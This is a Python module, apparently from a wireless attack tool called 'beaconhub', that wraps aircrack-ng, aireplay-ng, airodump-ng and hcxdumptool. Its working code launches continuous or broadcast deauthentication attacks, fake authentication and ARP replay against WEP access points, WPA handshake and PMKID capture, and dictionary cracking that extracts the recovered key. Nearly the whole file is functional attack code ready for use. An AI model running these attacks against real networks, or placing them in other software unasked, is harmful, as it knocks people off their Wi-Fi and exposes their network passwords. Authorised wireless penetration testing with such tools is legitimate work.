"""
aircrack-ng suite wrapper.
Handles monitor mode, packet capture, deauthentication, and handshake cracking.
"""

import os
import re
import signal
import subprocess
import logging
import time
from typing import Optional, Dict, List
from pathlib import Path

logger = logging.getLogger(__name__)

CAPTURE_DIR = "/opt/beaconhub/captures"
RUN_DIR = "/opt/beaconhub/run"
WORDLIST_DIR = "/opt/tools/wordlists"


class AircrackError(Exception):
    """Custom exception for aircrack-ng operations."""
    pass


class AttackProcess:
    """Represents a running attack process."""

    def __init__(self, attack_id: str, attack_type: str):
        self.attack_id = attack_id
        self.attack_type = attack_type
        self.process: Optional[subprocess.Popen] = None
        self.pid: Optional[int] = None
        self.output_file: Optional[str] = None
        self.log_file: Optional[str] = None
        self.packets_sent: int = 0
        self.started_at: float = 0
        self.target_bssid: str = ""
        self.interface: str = ""

    @property
    def is_running(self) -> bool:
        if self.process is None:
            return False
        return self.process.poll() is None


class AircrackManager:
    """Manages aircrack-ng suite tools for attacks."""

    def __init__(self):
        self._attacks: Dict[str, AttackProcess] = {}
        os.makedirs(CAPTURE_DIR, exist_ok=True)
        os.makedirs(RUN_DIR, exist_ok=True)

    def start_deauth(
        self,
        attack_id: str,
        interface: str,
        target_bssid: str,
        count: int = 0,
        client_mac: Optional[str] = None,
    ) -> AttackProcess:
        """
        Launch a deauthentication attack using aireplay-ng.
        count=0 means continuous. client_mac=None means broadcast deauth.
        """
        if attack_id in self._attacks and self._attacks[attack_id].is_running:
            raise AircrackError(f"Attack {attack_id} is already running")

        log_file = os.path.join(RUN_DIR, f"attack_{attack_id}.log")

        cmd = [
            "aireplay-ng",
            "--deauth", str(count),
            "-a", target_bssid,
        ]

        if client_mac:
            cmd.extend(["-c", client_mac])

        cmd.append(interface)

        log_fd = None
        try:
            log_fd = open(log_file, "w")
            process = subprocess.Popen(
                cmd,
                stdout=log_fd,
                stderr=subprocess.STDOUT,
                preexec_fn=os.setsid
            )
            log_fd.close()
            log_fd = None

            attack = AttackProcess(attack_id, "deauth")
            attack.process = process
            attack.pid = process.pid
            attack.log_file = log_file
            attack.started_at = time.time()
            attack.target_bssid = target_bssid
            attack.interface = interface
            self._attacks[attack_id] = attack

            logger.info(
                f"Started deauth attack {attack_id}: "
                f"target={target_bssid}, interface={interface}, count={count}"
            )
            return attack

        except FileNotFoundError:
            if log_fd:
                try: log_fd.close()
                except Exception: pass
            raise AircrackError("aireplay-ng not found. Is aircrack-ng suite installed?")
        except Exception as e:
            if log_fd:
                try: log_fd.close()
                except Exception: pass
            raise AircrackError(f"Failed to start deauth attack: {str(e)}")

    def start_capture(
        self,
        attack_id: str,
        interface: str,
        target_bssid: str,
        channel: int = 0,
    ) -> AttackProcess:
        """
        Start packet capture with airodump-ng to capture handshakes.
        """
        if attack_id in self._attacks and self._attacks[attack_id].is_running:
            raise AircrackError(f"Attack {attack_id} is already running")

        output_prefix = os.path.join(CAPTURE_DIR, f"capture_{attack_id}")
        log_file = os.path.join(RUN_DIR, f"attack_{attack_id}.log")

        cmd = [
            "airodump-ng",
            "--bssid", target_bssid,
            "--write", output_prefix,
            "--write-interval", "1",
            "--output-format", "pcap,csv",
        ]

        if channel > 0:
            cmd.extend(["--channel", str(channel)])

        cmd.append(interface)

        log_fd = None
        try:
            log_fd = open(log_file, "w")
            process = subprocess.Popen(
                cmd,
                stdout=log_fd,
                stderr=subprocess.STDOUT,
                preexec_fn=os.setsid
            )
            log_fd.close()
            log_fd = None

            attack = AttackProcess(attack_id, "capture_handshake")
            attack.process = process
            attack.pid = process.pid
            attack.output_file = f"{output_prefix}-01.cap"
            attack.log_file = log_file
            attack.started_at = time.time()
            attack.target_bssid = target_bssid
            attack.interface = interface
            self._attacks[attack_id] = attack

            logger.info(
                f"Started capture {attack_id}: "
                f"target={target_bssid}, interface={interface}"
            )
            return attack

        except FileNotFoundError:
            if log_fd:
                try: log_fd.close()
                except Exception: pass
            raise AircrackError("airodump-ng not found. Is aircrack-ng suite installed?")
        except Exception as e:
            if log_fd:
                try: log_fd.close()
                except Exception: pass
            raise AircrackError(f"Failed to start capture: {str(e)}")

    def stop_attack(self, attack_id: str) -> bool:
        """Stop a running attack."""
        if attack_id not in self._attacks:
            return False

        attack = self._attacks[attack_id]
        if attack.process and attack.is_running:
            try:
                os.killpg(os.getpgid(attack.process.pid), signal.SIGTERM)
                attack.process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                try:
                    os.killpg(os.getpgid(attack.process.pid), signal.SIGKILL)
                    attack.process.wait(timeout=3)
                except Exception:
                    pass
            except ProcessLookupError:
                pass
            except Exception as e:
                logger.error(f"Error stopping attack {attack_id}: {e}")

        logger.info(f"Stopped attack {attack_id}")
        return True

    def remove_attack(self, attack_id: str):
        """Remove an attack from tracking (after it's stopped)."""
        if attack_id in self._attacks:
            del self._attacks[attack_id]

    def stop_all(self):
        """Stop all running attacks."""
        attack_ids = list(self._attacks.keys())
        for attack_id in attack_ids:
            self.stop_attack(attack_id)

    def get_attack(self, attack_id: str) -> Optional[AttackProcess]:
        """Get attack info."""
        return self._attacks.get(attack_id)

    def get_attack_log(self, attack_id: str, lines: int = 50) -> str:
        """Get the last N lines of an attack's log."""
        attack = self._attacks.get(attack_id)
        if not attack or not attack.log_file:
            return ""
        if not os.path.exists(attack.log_file):
            return ""
        try:
            with open(attack.log_file, "r") as f:
                all_lines = f.readlines()
                return "".join(all_lines[-lines:])
        except Exception:
            return ""

    def check_handshake(self, cap_file: str) -> bool:
        """Check if a capture file contains a valid WPA handshake."""
        if not os.path.exists(cap_file):
            return False
        try:
            result = subprocess.run(
                ["aircrack-ng", cap_file],
                capture_output=True, text=True, timeout=15,
                input="q\n"  # quit immediately after check
            )
            # aircrack-ng outputs "1 handshake" if found
            return "1 handshake" in result.stdout
        except (subprocess.TimeoutExpired, FileNotFoundError):
            return False

    # ── WEP ARP Replay ──────────────────────────────────────────────────

    def start_fakeauth(
        self,
        attack_id: str,
        interface: str,
        target_bssid: str,
        source_mac: str,
        essid: Optional[str] = None,
    ) -> AttackProcess:
        """
        Associate with the AP using aireplay-ng -1 (fake authentication).

        WEP APs drop injected frames from stations they have not authenticated.
        Running a periodic fake auth keeps the monitor interface associated so
        the ARP replay's injected packets are accepted. Failure is non-fatal:
        if a real client is already associated we can replay using its MAC.
        """
        if attack_id in self._attacks and self._attacks[attack_id].is_running:
            raise AircrackError(f"Attack {attack_id} is already running")

        log_file = os.path.join(RUN_DIR, f"attack_{attack_id}.log")

        # "-1 30" re-authenticates every 30s to survive AP association timeouts.
        cmd = ["aireplay-ng", "-1", "30", "-a", target_bssid, "-h", source_mac]
        if essid:
            cmd.extend(["-e", essid])
        cmd.append(interface)

        log_fd = None
        try:
            log_fd = open(log_file, "w")
            process = subprocess.Popen(
                cmd,
                stdout=log_fd,
                stderr=subprocess.STDOUT,
                preexec_fn=os.setsid
            )
            log_fd.close()
            log_fd = None

            attack = AttackProcess(attack_id, "fakeauth")
            attack.process = process
            attack.pid = process.pid
            attack.log_file = log_file
            attack.started_at = time.time()
            attack.target_bssid = target_bssid
            attack.interface = interface
            self._attacks[attack_id] = attack

            logger.info(
                f"Started fake auth {attack_id}: "
                f"target={target_bssid}, source={source_mac}, interface={interface}"
            )
            return attack

        except FileNotFoundError:
            if log_fd:
                try: log_fd.close()
                except Exception: pass
            raise AircrackError("aireplay-ng not found. Is aircrack-ng suite installed?")
        except Exception as e:
            if log_fd:
                try: log_fd.close()
                except Exception: pass
            raise AircrackError(f"Failed to start fake auth: {str(e)}")

    def start_arp_replay(
        self,
        attack_id: str,
        interface: str,
        target_bssid: str,
        client_mac: str,
    ) -> AttackProcess:
        """
        Launch aireplay-ng -3 (ARP request replay) for WEP IV generation.

        This captures an ARP packet from the client, then replays it repeatedly
        with fresh IVs, generating ~500+ unique IVs/second.
        """
        if attack_id in self._attacks and self._attacks[attack_id].is_running:
            raise AircrackError(f"Attack {attack_id} is already running")

        log_file = os.path.join(RUN_DIR, f"attack_{attack_id}.log")

        cmd = [
            "aireplay-ng",
            "-3",
            "-b", target_bssid,
            "-h", client_mac,
            interface,
        ]

        log_fd = None
        try:
            log_fd = open(log_file, "w")
            process = subprocess.Popen(
                cmd,
                stdout=log_fd,
                stderr=subprocess.STDOUT,
                preexec_fn=os.setsid
            )
            log_fd.close()
            log_fd = None

            attack = AttackProcess(attack_id, "arp_replay")
            attack.process = process
            attack.pid = process.pid
            attack.log_file = log_file
            attack.started_at = time.time()
            attack.target_bssid = target_bssid
            attack.interface = interface
            self._attacks[attack_id] = attack

            logger.info(
                f"Started ARP replay {attack_id}: "
                f"target={target_bssid}, client={client_mac}, interface={interface}"
            )
            return attack

        except FileNotFoundError:
            if log_fd:
                try: log_fd.close()
                except Exception: pass
            raise AircrackError("aireplay-ng not found. Is aircrack-ng suite installed?")
        except Exception as e:
            if log_fd:
                try: log_fd.close()
                except Exception: pass
            raise AircrackError(f"Failed to start ARP replay: {str(e)}")

    def start_wep_capture(
        self,
        attack_id: str,
        interface: str,
        target_bssid: str,
        channel: int,
    ) -> AttackProcess:
        """
        Start airodump-ng capture for WEP IV collection.

        Captures on the target channel and writes pcap + CSV for IV counting.
        """
        if attack_id in self._attacks and self._attacks[attack_id].is_running:
            raise AircrackError(f"Attack {attack_id} is already running")

        output_prefix = os.path.join(CAPTURE_DIR, f"wep_{attack_id}")
        log_file = os.path.join(RUN_DIR, f"attack_{attack_id}.log")

        cmd = [
            "airodump-ng",
            "--bssid", target_bssid,
            "--channel", str(channel),
            "--write", output_prefix,
            "--write-interval", "1",
            "--output-format", "pcap,csv",
            interface,
        ]

        log_fd = None
        try:
            log_fd = open(log_file, "w")
            process = subprocess.Popen(
                cmd,
                stdout=log_fd,
                stderr=subprocess.STDOUT,
                preexec_fn=os.setsid
            )
            log_fd.close()
            log_fd = None

            attack = AttackProcess(attack_id, "wep_capture")
            attack.process = process
            attack.pid = process.pid
            attack.output_file = f"{output_prefix}-01.cap"
            attack.log_file = log_file
            attack.started_at = time.time()
            attack.target_bssid = target_bssid
            attack.interface = interface
            self._attacks[attack_id] = attack

            logger.info(
                f"Started WEP capture {attack_id}: "
                f"target={target_bssid}, channel={channel}, interface={interface}"
            )
            return attack

        except FileNotFoundError:
            if log_fd:
                try: log_fd.close()
                except Exception: pass
            raise AircrackError("airodump-ng not found. Is aircrack-ng suite installed?")
        except Exception as e:
            if log_fd:
                try: log_fd.close()
                except Exception: pass
            raise AircrackError(f"Failed to start WEP capture: {str(e)}")

    def get_iv_count(self, capture_file: str) -> int:
        """Count WEP IVs collected so far by reading the airodump-ng CSV.

        Parsing the CSV directly is far more reliable than shelling out to
        aircrack-ng (the old code called a non-existent ``-s`` stats mode and
        then read the wrong CSV column). The AP row's ``# IV`` field is column
        index 10 in airodump-ng's CSV layout.

        Accepts either the ``.cap`` or ``.csv`` path; airodump-ng writes both
        with the same ``-01`` prefix.
        """
        csv_file = capture_file
        if csv_file.endswith(".cap"):
            csv_file = csv_file[:-4] + ".csv"
        if not os.path.exists(csv_file):
            return 0
        try:
            with open(csv_file, "r", errors="ignore") as f:
                for raw in f:
                    line = raw.strip()
                    if not line:
                        continue
                    # The station section starts with a "Station MAC" header;
                    # everything past it is client data, not AP IV counts.
                    if line.startswith("Station MAC"):
                        break
                    if line.startswith("BSSID"):
                        continue
                    parts = [p.strip() for p in line.split(",")]
                    # AP rows start with a MAC and carry the '# IV' column (10).
                    if len(parts) > 10 and re.match(r"^[0-9A-Fa-f:]{17}$", parts[0]):
                        try:
                            return int(parts[10])
                        except ValueError:
                            continue
            return 0
        except Exception:
            return 0

    def list_captures(self) -> List[Dict[str, str]]:
        """List all capture files (.cap and .pcapng)."""
        captures = []
        for pattern in ["*.cap", "*.pcapng"]:
            for f in Path(CAPTURE_DIR).glob(pattern):
                captures.append({
                    "filename": f.name,
                    "path": str(f),
                    "size": str(f.stat().st_size),
                    "size_human": self._human_size(f.stat().st_size),
                    "modified": str(f.stat().st_mtime)
                })
        return captures

    # ── Cracking ────────────────────────────────────────────────────────

    def crack_wpa(
        self,
        attack_id: str,
        cap_file: str,
        wordlist: str,
        bssid: Optional[str] = None,
    ) -> AttackProcess:
        """
        Run aircrack-ng to crack a WPA/WPA2 handshake or WEP key.

        Args:
            attack_id: Unique ID for this crack attempt
            cap_file: Path to the .cap capture file
            wordlist: Path to the wordlist file
            bssid: Optional BSSID to target (filters multiple handshakes)
        """
        if attack_id in self._attacks and self._attacks[attack_id].is_running:
            raise AircrackError(f"Attack {attack_id} is already running")

        if not os.path.exists(cap_file):
            raise AircrackError(f"Capture file not found: {cap_file}")
        if not os.path.exists(wordlist):
            raise AircrackError(f"Wordlist not found: {wordlist}")

        log_file = os.path.join(RUN_DIR, f"attack_{attack_id}.log")

        cmd = ["aircrack-ng", "-w", wordlist]
        if bssid:
            cmd.extend(["-b", bssid])
        cmd.append(cap_file)

        log_fd = None
        try:
            log_fd = open(log_file, "w")
            process = subprocess.Popen(
                cmd,
                stdout=log_fd,
                stderr=subprocess.STDOUT,
                preexec_fn=os.setsid
            )
            log_fd.close()
            log_fd = None

            attack = AttackProcess(attack_id, "crack")
            attack.process = process
            attack.pid = process.pid
            attack.log_file = log_file
            attack.started_at = time.time()
            attack.output_file = cap_file
            self._attacks[attack_id] = attack

            logger.info(f"Started cracking {attack_id}: cap={cap_file}, wordlist={wordlist}")
            return attack

        except FileNotFoundError:
            if log_fd:
                try: log_fd.close()
                except Exception: pass
            raise AircrackError("aircrack-ng not found. Is aircrack-ng suite installed?")
        except Exception as e:
            if log_fd:
                try: log_fd.close()
                except Exception: pass
            raise AircrackError(f"Failed to start cracking: {str(e)}")

    def get_crack_result(self, attack_id: str) -> dict:
        """Parse the aircrack-ng log to extract cracking results."""
        attack = self._attacks.get(attack_id)
        if not attack or not attack.log_file:
            return {"status": "unknown", "key": None, "message": "No crack attempt found"}

        if not os.path.exists(attack.log_file):
            return {"status": "unknown", "key": None, "message": "No log file found"}

        try:
            with open(attack.log_file, "r") as f:
                content = f.read()

            # Check if still running
            if attack.is_running:
                # aircrack-ng's live progress line looks like:
                #   "[00:00:04] 4620/10303 keys tested (1157.02 k/s)"
                # Scan from the end for the most recent progress and parse it
                # with a regex so a stray token can't crash the whole call.
                tested = 0
                total = 0
                speed = None
                for line in reversed(content.split('\n')):
                    m = re.search(
                        r'(\d[\d,]*)\s*/\s*(\d[\d,]*)\s+keys\s+tested', line
                    )
                    if m:
                        tested = int(m.group(1).replace(',', ''))
                        total = int(m.group(2).replace(',', ''))
                        sm = re.search(r'\(\s*([\d.]+)\s*k/s\s*\)', line)
                        if sm:
                            speed = float(sm.group(1))
                        break
                    m2 = re.search(r'[Tt]ested\s+(\d[\d,]*)\s+keys', line)
                    if m2:
                        tested = int(m2.group(1).replace(',', ''))
                        break

                msg = f"Testing keys... ({tested:,}"
                msg += f"/{total:,} tested)" if total else " tested)"
                result = {
                    "status": "running",
                    "tested": tested,
                    "total": total,
                    "message": msg,
                }
                if speed is not None:
                    result["speed_kps"] = speed
                return result

            # Process finished - check result
            if "KEY FOUND!" in content:
                match = re.search(r'KEY FOUND!\s*\[\s*(.+?)\s*\]', content)
                key = match.group(1) if match else "unknown"
                return {
                    "status": "cracked",
                    "key": key,
                    "message": f"Key found: {key}"
                }
            elif "Passphrase not in dictionary" in content or "failed" in content.lower():
                return {
                    "status": "failed",
                    "key": None,
                    "message": "Passphrase not in dictionary"
                }
            else:
                return {
                    "status": "completed",
                    "key": None,
                    "message": "Cracking completed - check log for details"
                }

        except Exception as e:
            return {"status": "error", "key": None, "message": str(e)}

    # ── PMKID Capture ────────────────────────────────────────────────────

    def start_pmkid_capture(
        self,
        attack_id: str,
        interface: str,
        target_bssid: str,
        channel: int,
    ) -> AttackProcess:
        """
        Use hcxdumptool to capture PMKID from a target AP.
        PMKID attack doesn't require a client - only the first EAPOL frame from the AP.
        """
        if attack_id in self._attacks and self._attacks[attack_id].is_running:
            raise AircrackError(f"Attack {attack_id} is already running")

        output_file = os.path.join(CAPTURE_DIR, f"pmkid_{attack_id}.pcapng")
        log_file = os.path.join(RUN_DIR, f"attack_{attack_id}.log")

        # hcxdumptool syntax (v6.5+)
        cmd = [
            "hcxdumptool",
            "--device", interface,
            "--channel", str(channel),
            "--target_ap", target_bssid,
            "-o", output_file,
            "--active_interval", "1",
            "--stop_after", "60",  # Stop after 60 seconds
        ]

        log_fd = None
        try:
            log_fd = open(log_file, "w")
            process = subprocess.Popen(
                cmd,
                stdout=log_fd,
                stderr=subprocess.STDOUT,
                preexec_fn=os.setsid
            )
            log_fd.close()
            log_fd = None

            attack = AttackProcess(attack_id, "pmkid_capture")
            attack.process = process
            attack.pid = process.pid
            attack.output_file = output_file
            attack.log_file = log_file
            attack.started_at = time.time()
            attack.target_bssid = target_bssid
            attack.interface = interface
            self._attacks[attack_id] = attack

            logger.info(
                f"Started PMKID capture {attack_id}: "
                f"target={target_bssid}, channel={channel}, interface={interface}"
            )
            return attack

        except FileNotFoundError:
            if log_fd:
                try: log_fd.close()
                except Exception: pass
            raise AircrackError("hcxdumptool not found. Install with: apt install hcxdumptool")
        except Exception as e:
            if log_fd:
                try: log_fd.close()
                except Exception: pass
            raise AircrackError(f"Failed to start PMKID capture: {str(e)}")

    def convert_pmkid_to_hashcat(self, pcap_file: str) -> Optional[str]:
        """
        Convert a PMKID pcap capture to hashcat format (22000) using hcxpcapngtool.
        Returns the path to the hash file, or None if conversion failed.
        """
        if not os.path.exists(pcap_file):
            return None

        hash_file = pcap_file.rsplit(".", 1)[0] + ".22000"
        try:
            subprocess.run(
                [
                    "hcxpcapngtool",
                    "-o", hash_file,
                    pcap_file
                ],
                capture_output=True, text=True, timeout=30
            )
            if os.path.exists(hash_file) and os.path.getsize(hash_file) > 0:
                return hash_file
            return None
        except (subprocess.TimeoutExpired, FileNotFoundError) as e:
            logger.error(f"Failed to convert PMKID: {e}")
            return None

    def check_pmkid(self, pcap_file: str) -> bool:
        """Check if a capture file contains a PMKID."""
        if not os.path.exists(pcap_file):
            return False
        hash_file = self.convert_pmkid_to_hashcat(pcap_file)
        if hash_file and os.path.exists(hash_file):
            try:
                with open(hash_file, 'r') as f:
                    content = f.read().strip()
                return len(content) > 0
            except Exception:
                pass
        return False

    # ── Wordlist Management ─────────────────────────────────────────────

    def list_wordlists(self) -> List[Dict[str, str]]:
        """List all available wordlist files."""
        wordlists = []
        for d in [WORDLIST_DIR, "/opt/beaconhub/wordlists"]:
            if not os.path.exists(d):
                continue
            for f in Path(d).iterdir():
                if f.is_file():
                    wordlists.append({
                        "filename": f.name,
                        "path": str(f),
                        "size": str(f.stat().st_size),
                        "size_human": self._human_size(f.stat().st_size),
                    })
        return wordlists

    def _human_size(self, size: int) -> str:
        """Convert bytes to human-readable string."""
        for unit in ['B', 'KB', 'MB', 'GB']:
            if size < 1024:
                return f"{size:.1f} {unit}"
            size /= 1024
        return f"{size:.1f} TB"
